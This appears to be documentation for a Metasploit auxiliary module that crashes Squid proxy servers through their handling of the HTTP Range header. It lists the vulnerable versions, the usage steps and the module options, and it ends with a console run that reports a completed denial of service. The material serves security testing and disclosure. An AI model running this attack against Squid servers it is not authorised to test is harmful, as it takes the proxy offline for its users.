## Vulnerable Application

This module exploits a vulnerability in the Squid Caching Proxy server and its handling
of the `Range` HTTP header.

Due to the way Squid handles the HTTP request header `Range`, an assertion can be
caused due to a standard HTTP request. Once all of Squid's children workers have
asserted, a Denial of Service of the proxy is achieved.

Vulnerable versions of Squid include:
* 2.5.STABLE2-2.7.STABLE9.
* 3.0-4.1.4.
* 5.0.1-5.0.5.

Security bulletin from Squid: https://github.com/squid-cache/squid/security/advisories/GHSA-pxwq-f3qr-w2xf

## Verification Steps

1. Start msfconsole
2. `use auxiliary/dos/http/squid_range_dos.rb`
3. Set `rhost`
4. Set `rport`
5. run

## Options

### RequestCount

RequestCount is both the the number of HTTP requests which are sent to the server in
order to perform the actual Denial of Service (i.e. accepted requests by the server), 
and the number of requests that are sent to confirm that the Squid host is actually 
dead.

## Scenarios

```
msf > use auxiliary/dos/http/squid_range_dos

msf auxiliary(dos/http/squid_range_dos) > show options

Module options (auxiliary/dos/http/squid_range_dos):

   Name          Current Setting    Required  Description
   ----          ---------------    --------  -----------
   RHOSTS        127.0.0.1          yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT         3128               yes       The target port (TCP)
   RequestCount  50                 yes       The number of requests to be sent, as well as the number of re-tries to confirm a dead host


Auxiliary action:

   Name  Description
   ----  -----------
   DOS   Perform Denial of Service Against The Target

msf auxiliary(dos/http/squid_range_dos) > set rhost 10.210.1.1
rhost => 10.210.1.1
msf auxiliary(dos/http/squid_range_dos) > set rport 3128
rport => 3128
msf auxiliary(dos/http/squid_range_dos) > run
[*] Running module against 10.210.1.1

[*] 10.210.1.1:3128 - Sending 50 DoS requests to 10.210.1.1:3128
[*] 10.210.1.1:3128 - Sending DoS packet 1 to 10.210.1.1:3128
[*] 10.210.1.1:3128 - Sending DoS packet 2 to 10.210.1.1:3128
[*] 10.210.1.1:3128 - Sending DoS packet 3 to 10.210.1.1:3128
[*] 10.210.1.1:3128 - Sending DoS packet 4 to 10.210.1.1:3128
[*] 10.210.1.1:3128 - Sending DoS packet 5 to 10.210.1.1:3128
[+] 10.210.1.1:3128 - DoS completely successful
[*] Auxiliary module execution completed
```

At this point, the target Squid server should be completely inaccessible: all children 
workers should have exited, and the main process should have also shut down.
